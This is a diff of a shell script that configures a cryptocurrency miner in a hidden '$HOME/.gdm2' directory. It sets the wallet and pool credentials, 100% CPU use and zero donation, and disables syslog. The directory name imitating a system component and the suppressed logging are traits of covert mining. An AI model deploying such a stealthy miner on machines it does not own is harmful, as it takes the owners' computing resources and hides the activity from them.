@@ -319,11 +319,11 @@ sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "hv",/' $HOME/.gdm2/config.json
 sed -i 's/"tls-fingerprint": null,/"tls-fingerprint": "0763bdd689bf1940a75eb46d209704dde4dcc26dbdfa2aefd050c79fee3377ee",/' $HOME/.gdm2/config.json
 sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'log'",#' $HOME/.gdm2/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-over-proxy": 1,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
@@ -341,13 +341,6 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
 fi
-
-sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
-
-sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
-
-sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
-
 
 modprobe msr
 
